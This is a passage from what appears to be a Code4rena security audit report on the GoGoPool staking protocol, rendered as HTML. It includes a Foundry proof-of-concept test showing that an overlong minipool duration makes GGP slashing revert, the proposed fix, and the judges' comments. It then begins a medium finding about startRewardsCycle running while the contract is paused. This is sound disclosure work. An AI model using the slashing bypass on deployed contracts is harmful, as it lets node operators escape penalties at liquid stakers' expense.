class=\"mtk1\"> </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stakeGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ggpStakeAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Minipool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">createMinipool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxAssignmentRequest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;liqStaker1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">liqStaker1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ggAVAX</span><span class=\"mtk1\">.</span><span class=\"mtk12\">depositAVAX</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimAndInitiateStaking</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">txID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;txid&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rialto</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">minipoolMgr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">recordStakingEnd</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">validationAmt</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">mp1</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>See that it runs successfully with <code>duration = 365 days</code> and fails with <code>duration = 366 days</code>.</p>\n<p>The similar issue occurs when the GGP price drops. I chose to implement the test with <code>duration</code> as the cause for the underflow because your tests use a fixed AVAX/GGP price.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>You should check if the amount to be slashed is greater than the node operator’s GGP balance. If this is the case, the amount to be slashed should be set to the node operator’s GGP balance.</p>\n<p>I believe this check can be implemented within the <code>MinipoolManager.slash</code> function without breaking any of the existing accounting logic.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.nodeID&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.owner&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.ggpSlashAmt&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">GGPSlashed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">Staking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staking</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Staking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Staking&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">slashGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1380932948\">emersoncloud (GoGoPool) confirmed, but commented</a>:</strong></p>\n<blockquote>\n<p>This is a combination of two other issues from other wardens</p>\n<ol>\n<li>Slash amount shouldn’t depend on duration: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/694\">https://github.com/code-423n4/2022-12-gogopool-findings/issues/694</a></li>\n<li>GGP Slash shouldn’t revert: <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/743\">https://github.com/code-423n4/2022-12-gogopool-findings/issues/743</a></li>\n</ol>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1415768955\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This finding combines 2 issues:</p>\n<ul>\n<li>If price drops Slash can revert -> Medium</li>\n<li>Attacker can set Duration to too high to cause a revert -> High</li>\n</ul>\n<p>Am going to dedupe this and the rest, but ultimately I think these are different findings, that should have been filed separately.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/136#issuecomment-1415772950\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how a malicious staker could bypass slashing, by inputting a duration that is beyond the intended amount.</p>\n<p>Other reports have shown how to sidestep the slash or reduce it, however, this report shows how the bypass can be enacted maliciously to break the protocol functionality, to the attacker’s potential gain.</p>\n<p>Because slashing is sidestepped in it’s entirety, I believe this finding to be of High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>If staked GGP doesn’t cover slash amount, slash it all: <a href=\"https://github.com/multisig-labs/gogopool/pull/41\">multisig-labs/gogopool#41</a></p>\n</blockquote>\n<p><strong>Status:</strong> Original finding mitigated, but a medium severity economical risk is still present. Full details in reports from <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/6\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/61\">ladboy233</a> and <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/25\">hansfriese</a>. Also included in Mitigation Review section below.</p>\n<hr>\n<h1 id=\"medium-risk-findings-22\" style=\"position:relative;\"><a href=\"#medium-risk-findings-22\" aria-label=\"medium risk findings 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (22)</h1>\n<h2 id=\"m-01-rewardspoolsol--it-is-safe-to-have-the-startrewardscycle-with-whennotpaused-modifier\" style=\"position:relative;\"><a href=\"#m-01-rewardspoolsol--it-is-safe-to-have-the-startrewardscycle-with-whennotpaused-modifier\" aria-label=\"m 01 rewardspoolsol  it is safe to have the startrewardscycle with whennotpaused modifier permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/823\">[M-01] <code>RewardsPool.sol</code> : It is safe to have the <code>startRewardsCycle</code> with <code>WhenNotPaused</code> modifier</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/823\">ak1</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/745\">sces60107</a></em></p>\n<p>When the contract is paused , allowing startRewardsCycle would inflate the token value which might not be safe.</p>\n<p>Rewards should not be claimed by anyone when all other operations are paused.</p>\n<p>I saw that the <code>witdrawGGP</code> has this <code>WhenNotPaused</code> modifier.</p>\n<p>Inflate should not consider the paused duration.</p>\n<p>Let’s say, when the contract is paused for the duration of 2 months, then the dao, protocol, and node validator would enjoy the rewards. This is not good for a healthy protocol.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>startRewardsCycle does not have the WhenNotPaused modifier.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function startRewardsCycle() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (!canStartRewardsCycle()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\trevert UnableToStartRewardsCycle();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\temit NewRewardsCycleStarted(getRewardsCycleTotalAmt());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// Set start of new rewards cycle</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tsetUint(keccak256(&quot;RewardsPool.RewardsCycleStartTime&quot;), block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tincreaseRewardsCycleCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// Mint any new tokens from GGP inflation</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// This will always &#39;mint&#39; (release) new tokens if the rewards cycle length requirement is met</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t// \t\tsince inflation is on a 1 day interval and it needs at least one cycle since last calculation</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tinflate();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tuint256 multisigClaimContractAllotment = getClaimingContractDistribution(&quot;ClaimMultisig&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tuint256 nopClaimContractAllotment = getClaimingContractDistribution(&quot;ClaimNodeOp&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tuint256 daoClaimContractAllotment = getClaimingContractDistribution(&quot;ClaimProtocolDAO&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (daoClaimContractAllotment + nopClaimContractAllotment + multisigClaimContractAllotment &gt; getRewardsCycleTotalAmt()) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\trevert IncorrectRewardsDistribution();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tTokenGGP ggp = TokenGGP(getContractAddress(&quot;TokenGGP&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tVault vault = Vault(getContractAddress(&quot;Vault&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (daoClaimContractAllotment &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit ProtocolDAORewardsTransfered(daoClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvault.transferToken(&quot;ClaimProtocolDAO&quot;, ggp, daoClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (multisigClaimContractAllotment &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit MultisigRewardsTransfered(multisigClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tdistributeMultisigAllotment(multisigClaimContractAllotment, vault, ggp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\tif (nopClaimContractAllotment &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\temit ClaimNodeOpRewardsTransfered(nopClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tClaimNodeOp nopClaim = ClaimNodeOp(getContractAddress(&quot;ClaimNodeOp&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tnopClaim.setRewardsCycleTotal(nopClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvault.transferToken(&quot;ClaimNodeOp&quot;, ggp, nopClaimContractAllotment);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span>\n<span class=\"grvsc-line\"><span 